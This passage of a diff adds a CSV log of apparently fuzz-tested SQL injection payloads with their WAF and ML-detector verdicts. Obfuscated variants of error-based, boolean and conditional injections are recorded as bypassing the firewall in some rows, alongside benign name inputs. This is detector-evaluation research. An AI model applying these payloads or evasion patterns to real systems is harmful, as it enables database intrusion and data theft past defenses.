@@ -1,0 +1,285 @@
+Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10,Fuzzed Payload 11,Fuzzed Timestamp 11,WAF Status 11,ML Status 11,Combined Result 11,Fuzzed Payload 12,Fuzzed Timestamp 12,WAF Status 12,ML Status 12,Combined Result 12,Fuzzed Payload 13,Fuzzed Timestamp 13,WAF Status 13,ML Status 13,Combined Result 13,Fuzzed Payload 14,Fuzzed Timestamp 14,WAF Status 14,ML Status 14,Combined Result 14,Fuzzed Payload 15,Fuzzed Timestamp 15,WAF Status 15,ML Status 15,Combined Result 15
+1,2025-10-21T15:24:26.131270,wei-tsig8,200,200,200,both_correct,wei-tsig8,2025-10-21T15:24:48.371056,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:25:14.431674,200,200,both_correct,wei-tsig8,2025-10-21T15:25:40.248766,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:26:06.301859,200,200,both_correct,wei-tsig8,2025-10-21T15:26:31.756561,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:26:57.809337,200,200,both_correct,wei-tsig8,2025-10-21T15:27:23.748054,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:27:49.798327,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:28:15.842281,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:28:41.894886,200,200,both_correct,wei-tsig8,2025-10-21T15:29:07.164363,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:29:33.208873,200,200,both_correct,wei-tsig8,2025-10-21T15:29:58.014672,200,403,waf_correct_ml_incorrect,wei-tsig8,2025-10-21T15:30:24.059332,200,200,both_correct,wei-tsig8,2025-10-21T15:30:48.283629,200,403,waf_correct_ml_incorrect
+2,2025-10-21T15:31:14.339804,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",403,403,403,both_correct,"1 ANd row  (  6237,7469  )  >  (  seLeCT count  (  *  )  ,concat  ( 
+0x7171706a71,  (  seLect   (  elt  (  (SELECT 1)   like   6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  4168!=4169  )  *2   )    )   x fRoM   (  selECT (sElECt 5192) union sElEcT 3785 union SelECT 3931 union SELeCT/*C-*/7158  )  a group by x  )  ",2025-10-21T15:31:35.774094,403,403,both_correct,"1 and row  (  6237,7469  )  >  (  SELEct count  (  *  )  ,concat  ( 
+0x7171706a71,  (  sELeCT   (  elt  (  (SELeCT 1)   LiKE /**/ 6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  4710<>4711 not like 4169  )  *2   )    )   x frOm   (  sElect (SelecT 5192) union sElEct 3785 union SeleCt  AND 0x1 union SElEct/**/7158  )
+ a group by x  )  ",2025-10-21T15:32:01.833296,403,403,both_correct,"1 anD row  (  6237,7469  )  >  (  sELECT count  (  *  )  ,concat  ( 
+0x7171706a71,  (  SELEct   (  elt  (  (SElect 1)   LiKe /**/ 6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  (sElEct 4710)<>4711 not like '
+Qp' LIKE '
+Qp'  )  *2   )    )   x FrOM   (  SelecT (SElEcT 5192) union sELECT 3785 union SElECT  ANd 0x1 union sElECt (sElECT 1) 
+)
+ a group by x  )  ",2025-10-21T15:32:26.737500,403,403,both_correct,"1 ANd row  (  6237,7469  )  >  (  SeLECT count  (  *  )  ,concat  ( 
+0x7171706a71,  ( /**/Select   (  elt  (  (selecT 1)   liKe /**/ 6237,(selEcT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  (sELecT 4710)<>4711 not like '
+Qp' likE '
+Qp'  )  *2   )
+   )   x FrOm   (  seLEcT (sELEct 5192) union seLecT 6041 IN (6040,6041,6042) union selECt  aND 0x1 union SELecT (seLect  AND 1) 
+)
+ a group by x  )  ",2025-10-21T15:32:52.796984,403,403,both_correct,"1 aNd row  (  6237,7469  )  >  (  SelEct count  (  *  )  ,concat  ( 
+0x7171706a71,  ( /**/sELEct   (/**/ elt  (  (SElEct 1)  
+LiKE /**/ 6237,(SelECT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SElEcT 4710)<>0x1267 not like '
+Qp' Like '
+Qp'  )  *2   )
+   )   x from   (  selEct (SeLect 5192) union SELect 6041 In (6040,6041,(SElEcT 1)) union seLect  AND 0x1 union seLecT (SElEcT  aNd 1) 
+)
+ a group by x  )  a",2025-10-21T15:33:16.492584,403,403,both_correct,"3161= AND 1 and row  (  6237,7469  )  >  (  seleCT count  (  *  )  ,concat  ( 
+0x7171706a71,  ( /**/SELEcT   (/**/ elt  (  (seLeCt 0x1)  
+lIKE   6237,(SeleCT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELecT 4710)<>0x1267 not like '
+Qp' LIKE '
+Qp'  )  *2   )
+   )   x from   (  seLecT (selEcT 5192) union SElEct 6041 IN (6040,6041,(SeLeCt 1)) union SEleCT  ANd 0x1 union sElect (SElecT  aND 1) 
+)	 a group by x  )  abu",2025-10-21T15:33:42.568307,403,403,both_correct," oR 0= AND 1 ANd row  (  6237,'o' LIKE 'o'  )  >  (  sELECt count  (  *  )  ,concat  ( 
+0x7171706a71,  ( /*o+*/sELECT   (/**/ elt  (/**/ (seLEcT 0x1)  
+liKe   6237,(SELecT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (seLEcT 4710)<>0x1267 not like '
+Qp' LiKe '
+Qp'  )  *2   )
+   )   x FROM   (  SELECT (SeLECT 0x1448) union seLEct 6041 in (6040,6041,(sElECT 1)) union selEcT  aNd 0x1 union SEleCt (SeleCt  and 1) 
+)
+ a group by x  )  abu",2025-10-21T15:34:00.734023,403,403,both_correct," Or 0= anD 1 AnD row  (  6237,'o' LiKe 'o'  )  >  (  selecT count  (  *  )  ,concat  ( 
+0x7171706a71,  ( /*o+*/SelEct   (/**/ elt  (/**/ (SelEct 0x1)  
+lIKe   6237,(SElECT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SeLEct 4710) not like 0x1267 not like '
+Qp' like '
+Qp'  ) /**/*2   )    )   x from   (  SelecT (sELeCT 0x1448) union SELeCt 0x1799 In (6040,'gcJj'<>'gcJje',(SELECT (SELECT 1))) union SElEct  ANd 0x1 union seleCT (SeLECt  AnD 1) 
+)
+ a group by x  )  abuZ",2025-10-21T15:34:17.092518,403,403,both_correct," Or 0= AnD (SELECT 1) And row  (  7125 LIKE 7125,'o' LikE 'o'  )  >  (  sELECT count  (  * 	)  ,concat  ( 
+0x7171706a71,  ( /**/SelECt   (/**/ elt  (  (SeleCt 0x1)  
+liKE    oR 0,(seLecT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELEcT 4710) not like 0x1267 not like '
+Qp' liKE '
+Qp'  ) /**/*2   )    )   x From   (  select (selecT 0x1448) union sElect 0x1799 In (6040,'gcJj'<>'gcJje',(Select (sELecT 1))) union selEcT  And 0x1 union SelECt (sELECT  AnD 1) 
+)
+ a group by x  )  abuZE",2025-10-21T15:34:33.830046,403,403,both_correct," or 0= AnD (SelECt (SElEcT 1)) aNd row  (  7125 LiKe 7125,'o' lIKe 'o'  )  >  (  SeLECt count  (  * 	)  ,concat  ( 
+0x7171706a71,  (  SeleCt   (/*Yz*/ elt  (  (sElecT 0x1)  
+LikE    OR 0,(SELECt '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (sElect
+4774=4774) not like 0x1267 not like '
+Qp' LiKE '
+Qp'  ) /**/*2   )    )   x fRom   (  seLeCt (seLect 0x1448) union SeLect 0x1799 iN (6040,'gcJj'!='gcJje',(SElEcT (SELECT 1))) union sELECT  AND 0x1 union SelEcT (SeLEcT  AnD (SElECT 1)) 
+)
+ a group by x  )  abuZE",2025-10-21T15:34:50.994357,403,403,both_correct," OR  or '5'='5'= anD (sELEcT (sElECT (selEct 1))) aND row  (  7125 like 7125,'o' lIKe 'o'  )  >  (  SELEcT count  (  * 
+)  ,concat  ( 
+0x7171706a71,  (  sElEct   (  elt  (  (sELECt 0x1)  
+lIKE    oR 0,(sEleCT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (seLECt
+4774=4774) not like 0x1267 not like '
+Qp' LIKe '
+Qp'  ) /*}(6@*/*2   )    )   x FroM   (  SElecT (SELECT 0x1448) union select 0x1799 In (6040,'gcJj'!='gcJje',(seLECT (sELEct 1))) union SELECT  ANd 0x1 union selecT (SeLEct  AND (SelecT 1)) 
+)
+ a group by x  )  abuZE",2025-10-21T15:35:15.802025,403,403,both_correct," or  OR '(SELECT 5)' LIKE '5'= aNd (SeLECT (SEleCt (SelEcT  And 1))) ANd/**/row  (  7125	likE 7125,'o' LiKe 'o'  )  >  (  sElect count  (  * 
+)  ,concat  ( 
+0x7171706a71,  (  SeLeCt   (  elt  (  (SELeCt 0x1)  
+LIKe    OR 0,(SELeCt '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (seleCt
+4774=4774) not like 0x1267 not like '
+Qp' like '
+Qp'  ) /*}(6@*/*2   )    )   x FroM   (  sELECt (SELEcT 0x1448) union SELECT 0x1799 In ('??&\'='??&\','gcJj'!='gcJje',(seLecT (SElect 1))) union SELeCt  ANd 0x1 union SElECt (SelECt  and (SEleCT 1)) 
+)
+ a group by x  )  abuZE5",2025-10-21T15:35:32.933817,403,403,both_correct," oR  oR '(SELECT 0x5)' lIkE '5'= aNd (sELECt (SELeCT (SelEcT  and  OR 0))) anD row  (  7125	liKE '!' LIKE '!','o' lIke 'o'  )  >  (  seLeCt count  (  *  )  ,concat  ( 
+0x7171706a71,  (  selECT   (  elt  (  (selEcT 0x1)  
+lIkE    oR 0,(seLeCT '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (selecT
+4774 like 4774) not like 0x1267 not like '
+Qp' lIkE '
+Qp'  ) /*}(6@*/*2   )    )   x FrOM   (  SELECt (seLEct 0x1448) union sElect 0x1799 iN ('??&\'='??&\','gcJj'!='gcJje',(seLeCt (sELECT 1))) union SELeCT  and 0x1 union SeLEcT (SeleCt  aND (seleCt 1)) 
+)
+ a group by x  )  abuZE5",2025-10-21T15:35:50.815470,403,403,both_correct," OR  OR '(SELECT 0x5)' lIke '5' like  ANd (SelECt (sElEcT (sElECT  And  oR 0))) And row  (   AND 1 lIKe '!' lIKe '!','o' LikE 'o'  )  >  (  SELEcT count  (  *  )  ,concat  ( 
+0x7171706a71,  (  SeLeCt   (  elt  (  (SElEcT 0x1)  
+LiKe    Or 0,(sELect '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SeleCT
+4774 lIke 4774) not like 0x1267 not like '
+Qp' liKe '
+Qp'  ) /*}(6@*/*(SELECT '$}h' LIKE '$}h')   )    )/**/  x frOm   (  sELeCt (sElEct 0x1448) union sELeCt 0x1799 In ('??&\'='??&\','gcJj'!='gcJje',(SeLECt (SelEct 1))) union SeLEcT  And 0x1 union seLeCt (SELeCt  AnD (SelECt 1)) 
+)
+ a group by x  )  abuZE5",2025-10-21T15:36:06.709813,403,403,both_correct,"/**/oR  Or '(SELECT 0x5)' like '5' lIKE  anD (sElecT (sELect (sELect  and  Or  OR 0))) aNd row  (   && 1 LiKE '!' LIKe '!','o' LIkE 'o'  )  >  (  Select count  (  *  )  ,concat  ( 
+0x7171706a71,  (  SELEcT   (  elt  (  (SeLECt 0x1)  
+LiKe    Or 0,(sELEct '#& O<'<>'#& O<%')   )    )     )  ,0x717a767a71,floor  (  rand  (  (SeLeCT
+(SELECT 4774) lIKE '0' NOT LIKE '0N') not like 0x1267 not like ' Qp' like '
+Qp'  ) /*}(6@*/*(SEleCT '$}h' liKe '$}h')   )    )/**/  x fROm   (  sElECt (SelECt 0x1448) union SELECt 0x1799 iN ('??&\'='??&\','gcJj'!='gcJje',(sElEcT (sEleCT 1))) union SelECT  and 0x1 union sELecT (SeLeCT  AnD (sELEct 1)) 
+)
+ a group by x  )  abuZE5",2025-10-21T15:36:24.059892,403,403,both_correct
+3,2025-10-21T15:36:40.598957,nicolalde llovet,200,200,200,both_correct,nicolalde	llovet,2025-10-21T15:36:56.698160,200,200,both_correct,nicolalde llovet,2025-10-21T15:37:15.077208,200,200,both_correct,nicolalde/**/llovet,2025-10-21T15:37:31.922692,200,403,waf_correct_ml_incorrect,nicolalde llovet,2025-10-21T15:37:49.445183,200,200,both_correct,nicolalde	llovet,2025-10-21T15:38:06.250998,200,200,both_correct,nicolalde/*?ZRr*/llovet,2025-10-21T15:38:23.346767,200,403,waf_correct_ml_incorrect,nicolalde/**/llovet,2025-10-21T15:38:40.797397,200,403,waf_correct_ml_incorrect,nicolalde/*s*/llovet,2025-10-21T15:38:57.621208,200,403,waf_correct_ml_incorrect,nicolalde/*O*/llovet,2025-10-21T15:39:14.632699,200,403,waf_correct_ml_incorrect,nicolalde llovet,2025-10-21T15:39:31.398469,200,200,both_correct,nicolalde/**/llovet,2025-10-21T15:39:48.824941,200,403,waf_correct_ml_incorrect,"nicolalde
+llovet",2025-10-21T15:40:05.647327,200,200,both_correct,nicolalde	llovet,2025-10-21T15:40:22.001238,200,200,both_correct,"nicolalde
+llovet",2025-10-21T15:40:38.951593,200,200,both_correct,nicolalde llovet,2025-10-21T15:40:55.783121,200,200,both_correct
+4,2025-10-21T15:41:12.379951,"iif  (  7889  =  5114,1,1/0  )  ",403,403,200,waf_correct_ml_incorrect,"iif/**/ (  7889   LIkE   	ANd 1,'F!(' LIke 'F!(',1/0x0  )  ",2025-10-21T15:41:28.509641,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1 
+ LikE   	AnD 1,'F!(' LIKe 'F!(',6698 NOT LIKE  || 0/0x0  )  ",2025-10-21T15:41:46.871192,200,200,both_incorrect,"iif  (  0x1ed1 
+ LiKE   
+And 3549!=(SELECT 0x1),'F!(' Like 'F!(',6698/*w(_ */not like  || 0/0x0  )  ",2025-10-21T15:42:03.577234,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1 
+/**/like   
+aND  Or 0!=(SElECT 0x1),'F!(' liKe 'F!(',2094 IN (2093,2094,2095)/*w(_ */not like   or  (SELECt 0)/0x0  ) 
+",2025-10-21T15:42:19.546049,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1 
+ LIkE   
+aNd  oR 0 NOT LIKE (select
+0x1),'F!(' LiKe 'F!(',2094 In (0x82d,2094,2095)/*w(_ */not like   or  (sELecT  AND 1 NOT LIKE 726)/0x0  ) 
+",2025-10-21T15:42:35.755366,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1 
+ LIKe    AND  or 6886 IN (6885,6886,6887) not like/**/(sElECT
+0x1),'F!(' lIKE 'F!(',(sELECt 1) in (0x82d,2094,2095)/*w(_ */not like   Or  (SELeCT  AnD 1 NOT LIKE (SELECT 726))/0x0  ) 
+",2025-10-21T15:42:52.614460,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/**/
+ LikE    anD  OR 6886 iN ( aNd 1,6886,0x1ae7) not like/**/(SeLEcT
+0x1),'F!(' LIkE	'F!(',(seLEcT 1444 IN (1443,1444,1445)) in (0x82d,2094,2095)/*w(_ */not like   oR  (sELecT  aNd 1 not like (Select 726))/0x0  ) 
+",2025-10-21T15:43:10.049403,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/**/	 LIke    ANd  or '~'!='~S' iN ( AnD 1,6886,0x1ae7) not like/**/(seLEct
+0x1),'F!(' LIke	'F!(',(SELECT 1444 IN (0x5a3,1444,1445)) in (0x82d,2094,2095)/*w(_ */not like   Or  (sElecT  AND  && 1 not like/**/(sElECt 726))/0x0  ) 
+",2025-10-21T15:43:27.094602,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/*e*/	 LIKe    AnD  oR '~'!='~S' in ( ANd (selecT 1),6886,0x1ae7) not like/**/(SELect
+0x1),'F!(' LIke	'F!(',(SelecT
+7655<>7656 IN (0x5a3,1444,1445)) iN (0x82d,2094,0x82f)/*w(_ */not like   or  (SeLEcT /**/aNd   ANd  1 not like/**/(sElecT 726))/0x0  ) 
+",2025-10-21T15:43:44.296634,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/*e*/	 lIkE    AnD  OR '~'<>'~S'/**/IN ( aNd (sELecT (selEct 1)),6886,0x1ae7) not like/**/(SeLEcT
+0x1),'F!(' liKe	'F!(',(seLEcT
+7655<>(SeLECt 7656)	In (0x5a3,1444,'%pW\\' NOT LIKE '%pW\\.')) iN (0x82d,2094,0x82f)/*w(_ */not like   OR  (SeLECt /**/aND   and  1 not like/**/(selecT 726))/0x0  ) 
+",2025-10-21T15:44:01.084097,403,403,both_correct,"iif  (  0x1ed1/*e*/	 LIke    AND  OR '~' NOT LIKE '~S'/**/IN ( anD (SeLecT (sELect 0x1)),6886,0x1ae7) not like (SELEct
+0x1),'F!(' LiKe
+'F!(',(seLEcT
+7655<>(seLECT (sElECT 1))	In (0x5a3,1444,'%pW\\' NOT LIKE '%pW\\.')) In (0x82d,'#Sm' NOT LIKE '#SmN',0x82f)/*w(_ */not like   OR  (seLEct /**/aND   aNd  1 not like/**/(SeLEct 726))/0x0  ) 
+",2025-10-21T15:44:17.498931,403,403,both_correct,"iif  (  0x1ed1/*e*/	 LikE    AnD  Or '~' NOT LIKE '~S'/**/in ( AND (sElEct (selECt 0x1)),6886,0x1ae7) not like (SelecT
+0x1),'F!(' LIKE
+'F!(',(sEleCT	7655 NOT LIKE (selECT (SeLEct 's' liKE 's'))	iN (0x5a3,1444,'%pW\\' NOT LIKE '%pW\\.')) In (0x82d,'#Sm' NOT LIKE/**/'#SmN',0x82f)/*w(_ */not like   Or  (seLECT /*\O4*/aNd   aND  1 not like/**/(seLECt (SEleCt 0x1)))/0x0  ) 
+",2025-10-21T15:44:33.957724,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/*e*/	 LIKE    aNd  oR '~' NOT LIKE '~S'/**/iN ( AND (sElEcT (seleCT 0x1)),6886,0x1ae7) not like (SeLEcT	0x1),'F!(' like
+'F!(',(seLEcT	0x1de7 not like (sELeCT (SELeCt 's' lIke 's'))	IN (0x5a3, AND 1<>3573,'%pW\\' NOT LIKE '%pW\\.')) iN (0x82d,'#Sm' NOT LIKE '#SmN',0x82f)/*w(_ */not like   OR  (seLEct /*\O4*/ANd   AND  1 not like/**/(selecT (SELEcT 0x1)))/0x0  ) 
+6",2025-10-21T15:44:50.821013,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/*e*/	 lIkE    aNd  or '~' NOT LIKE '~S'/**/iN ( aNd (SELEcT (SeLecT 0x1)),6886,0x1ae7) not like (SelEcT	0x1),'F!(' LikE
+'F!(',(sELect	0x1de7 not like (SEleCt (seLeCt 's' LiKe 's'))
+in (0x5a3, ANd ')IW@!'!=')IW@! OR 0' NOT LIKE 0xdf5,'%pW\\' NOT LIKE '%pW\\.')) in (0x82d,'#Sm' NOT LIKE '#SmN',0x82f)/*w(_ */not like   or  (sElEct /**/aND   AnD  1 not like (seLEcT (SELECt 0x1)))/0x0  ) 
+6",2025-10-21T15:45:08.366973,200,403,waf_incorrect_ml_correct,"iif  (  0x1ed1/*e*/	 LIkE    aND  oR '~' NOT LIKE '~S' IN ( anD (SELECT (sELecT 0x1)),(SelEcT 6886),0x1ae7) not like (SElEct	0x1),'F!(' liKe
+'F!(',(SeleCt	0x1de7 not like (SELecT (SElecT 's' liKe 's'))
+iN (0x5a3, ANd ')IW@!'!=')IW@! OR '~'!='~N'' NOT LIKE 0xdf5,'%pW\\' NOT LIKE '%pW\\.')) iN (0x82d,'#Sm'
+not like '#SmN',0x82f)/*w(_ */not like   oR  (SElecT /**/ANd   and   aNd 1 not like (SEleCt (SelECt 0x1)))/0x0  ) 
+6Ca",2025-10-21T15:45:25.017894,200,403,waf_incorrect_ml_correct
+5,2025-10-21T15:45:41.779463,select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,403,403,403,both_correct,SElEct   (  CASE WHeN   (  1726	  LIKE   4080  )   ThEN 1726 ELSe (SELeCt 1)/  (  selEcT  AND 1<>1636  )   ENd /**/)  --,2025-10-21T15:45:58.139330,403,403,both_correct,SElECt   (  cAsE WhEn   (   Or 0   like   4080  )   tHeN 1726 ElSe (selEct 1)/  (  SELect  And 3355<>0xd1c NOT LIKE 1636  )   End  )  --,2025-10-21T15:46:16.148257,403,403,both_correct,"SelEcT   (  caSE wheN   (   oR 0x0	  liKE   4080  )   tHEN '`='='`=' ElSE (sELeCt 1)/  (  sElECT  And 3355<>0xd1c NOT LIKE  && 1/**/ )   eNd  )  --",2025-10-21T15:46:32.708977,403,403,both_correct,"SELEcT   (  Case
+When   (   || 0x0	  LikE   0xff0  )   theN '`='='`=' eLsE (SELecT  OR 0)/  (  SelECt  AnD 3355<>0xd1c NOT LIKE  && 9287 LIKE 9287  )   ENd  )  --",2025-10-21T15:46:49.698495,403,403,both_correct,"SElECt   (  cASe
+WHEn   (   || 0x0	  lIKe   0xff0  )   THeN '`='='`=' ElsE (SELect  Or 8183=8183)/  ( 
+SELeCT  aND 3355 NOT LIKE 0xd1c NOT/**/LIKE  && 0x2447 LIke  And 1  )   EnD  )  --",2025-10-21T15:47:08.487313,403,403,both_correct,"SeLeCt   (  cASE
+WHeN   (    OR  0x0	  LIKe
+  0xff0  )   Then '`='='`=' else (selEcT  Or 8183='a""a' LIKE 'a""a')/  ( 
+SEleCt  And 0xd1b NOT LIKE 0xd1c NOT LIKE  && 0x2447 lIKE  anD  OR 0  )   EnD  )  --",2025-10-21T15:47:26.460609,403,403,both_correct,"seLecT   (  CASe
+WHeN   (    oR  0x0   lIKE
+  0xff0  )/**/  tHEn '`='='`=' elSe (SeleCt  or 805= aNd (SELECT 1)='a""a' Like 'a""a')/  ( 
+seLECt  && 0xd1b NOT LIKE 0xd1c NOT LIKE  && 0x2447 like  And  OR 0  )   EnD  )  --",2025-10-21T15:47:42.632851,403,403,both_correct,"seLeCT   (  Case
+wHen   (    Or  0x0   lIkE
+  0xff0  )/*aQ ,*/  theN '`=' LIKE '`=' ELsE (seLECt  or 805= AND (SeLECT 1)='a""a' Like 'a""a')/  ( 
+selEct  && 0xd1b NOT LIKE 0xd1c/**/NOT LIKE  && 0x2447 LIKE  anD  or (SELECT 1)=0x21ab  )  
+End  )  --",2025-10-21T15:47:59.955601,403,403,both_correct,"seLeCT   (  CASE
+WHen   (    Or  0x0   lIKe
+  0xff0  )/*aQ ,*/  then '`=' LIKE '`=' Else (SelECt  Or 805= and (sELECt 1)='a""a' LIke 'a""a')/  (  Select  && 0xd1b not like 0xd1c NOT LIKE  && 0x2447 liKE  aND  oR (SeleCT  OR (seLecT 0)!=3793)=0x21ab  )  
+enD  )  --",2025-10-21T15:48:16.884846,403,403,both_correct,"seLECt   (  case
+wHEn   (    Or  0x0   LiKE
+ 	0xff0  )/**/  TheN '`=' likE/**/'`=' elsE (SElECT  Or (SELECT 1)= AND (sEleCT 8953 NOT LIKE 8954) LIKE 'a""a' lIke 'a""a')/  (  sElEcT  && 0xd1b not like 0xd1c NOT LIKE  && 0x2447 LiKe  and  or (SElecT  or (seLECt 0)!=0xed1)=0x21ab  )  
+enD  )  --",2025-10-21T15:48:34.206662,403,403,both_correct,"SeleCT   (  CASe
+wHEn   (    oR  0x0   Like
+  0xff0  )/*!L*/  Then '`=' liKE '`=' Else (selECT  Or (sELEct '@'!='@=') LIke  And (SeLEcT  OR 0 NOT LIKE 8954) liKe 'a""a' LIke 'a""a')/  (  SElECt  && 0xd1b not like 0xd1c NOT LIKE  && 0x2447 lIkE  And  or (selECt  or (seLecT 0x0)!=0xed1)=0x21ab  )  
+eND  )  --",2025-10-21T15:48:52.597424,403,403,both_correct,"sElect   (  CasE
+wHEn   (    Or  0x0   lIKE
+  0xff0  )/*!L*/  then '`=' liKe '`=' ElSE (seleCt  OR (sELeCT '@'!='@=') liKe  aNd (seLeCT 	OR (sELECt (SELECT 1)) NOT LIKE 'Z'='Z') liKE 'a""a' lIKE 'a""a')/  (  SElECT   and  0xd1b not/**/like 0xd1c NOT LIKE  && 0x2447 Like  aND  oR (select  Or (seLecT 0x0)!=0xed1)=0x21ab  )  
+EnD  )  --",2025-10-21T15:49:08.980792,403,403,both_correct,"Select   (  CAsE
+WheN   (    OR  0x0   liKE
+  0xff0  )/**/  Then '`=' LiKE '`=' eLsE (select  oR (sELeCT '@'!='@=') Like  And (sELEcT  oR (SELeCt (sElECt (SElEct (sELECT 6526 IN (6525,6526,6527))))) not like 'Z'='Z') Like 'a""a' like 'a""a')/  (  selECt   and  0xd1b not like 0xd1c NOT LIKE  && 0x2447 lIKE  aNd  Or (seleCt  oR (SELEcT 0x0)!=0xed1)=0x21ab  )  
+eND  )  --",2025-10-21T15:49:26.162270,403,403,both_correct,"select   (  cAse
+wHeN   (    oR  0x0   lIke	  0xff0  )/**//**/ THEn '`=' LIke '`=' ELSE (SELeCt  oR (SeLecT '@'!='@=') Like  AnD (SElECt  or (SElEcT (seleCT (SeLEcT (sElecT 6526 In (6525,(sELEcT (SELECT 1)),'x'!='x}'))))) not like 'Z'='Z') LIKE 'a""a' LiKe 'a""a')/  (  SElect   ANd  0xd1b not like 0xd1c NOT LIKE  && 0x2447 lIkE  and  Or (SElECt  Or (SeLeCT 0x0)!=0xed1) LikE 0x21ab  )  
+END  )  --",2025-10-21T15:49:42.697514,403,403,both_correct,"Select   (  CaSe	WHeN   (    oR  0x0   lIKe	  0xff0  )/**//**/ TheN '`=' lIKE '`=' ElSe (sElEct  OR (sEleCt '@' NOT LIKE '@=') liKE  aND/**/(sElecT  Or (SeLEct (SELECt (SelECT (seLect 0x117f!=4480 In ((sELecT 1),(SELEcT (seLECT 1)),'x'!='x}'))))) not like 'Z'='Z') liKE 'a""a' LikE 'a""a')/  (  seleCt   AND  0xd1b not like 0xd1c NOT LIKE  && 0x2447 lIke  anD  oR (seLeCT  Or (seLect 0x0)!=0xed1) LIkE 0x21ab  )  
+END  )  --",2025-10-21T15:50:00.090477,403,403,both_correct
+6,2025-10-21T15:50:17.725051,doortje,200,200,200,both_correct,doortje,2025-10-21T15:50:34.030458,200,200,both_correct,doortje,2025-10-21T15:50:52.272568,200,200,both_correct,doortje,2025-10-21T15:51:09.070197,200,200,both_correct,doortje,2025-10-21T15:51:25.717997,200,200,both_correct,doortje,2025-10-21T15:51:42.897558,200,200,both_correct,doortje,2025-10-21T15:51:59.493193,200,200,both_correct,doortje,2025-10-21T15:52:15.728856,200,200,both_correct,doortje,2025-10-21T15:52:32.643842,200,200,both_correct,doortje,2025-10-21T15:52:50.142348,200,200,both_correct,doortje,2025-10-21T15:53:06.532985,200,200,both_correct,doortje,2025-10-21T15:53:23.463843,200,200,both_correct,doortje,2025-10-21T15:53:40.419659,200,200,both_correct,doortje,2025-10-21T15:53:57.350957,200,200,both_correct,doortje,2025-10-21T15:54:14.305452,200,200,both_correct,doortje,2025-10-21T15:54:30.628940,200,200,both_correct
+7,2025-10-21T15:54:48.137932,"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",403,403,403,both_correct,"-6760 || 1570  =  convert  (  int,  (  sELeCT char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sElect   (  CaSe WheN   (  (sELeCt 1)  =  1570  )   ThEN char  (  49  )   ELSE char  (  48  )   END   )    )   +char  (  113  )  +char  (  (SELECT 122)  )  +char  (/*1@1N*/ 118  )  +char  (  'L/`' LIKE 'L/`'  )  +char  (  113   )    )   	 )  # ikqw",2025-10-21T15:55:03.922787,403,403,both_correct,"-6760 || 1570  =  convert  (  int,  (  sELect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seLect   (  caSE WHen   (  (SELEct 1)   LIKe   1570  )   tHEN char  (  5247= AnD 1  )   eLsE char  (  48  )   EnD   )    )  /**/+char  (  0x71  )  +char  (  (SeLECT 122)  )  +char  (/*OGNa*/ 118  )  +char  (  'L/`' LikE 'L/`'  )  +char  (  113   )    )     )  # 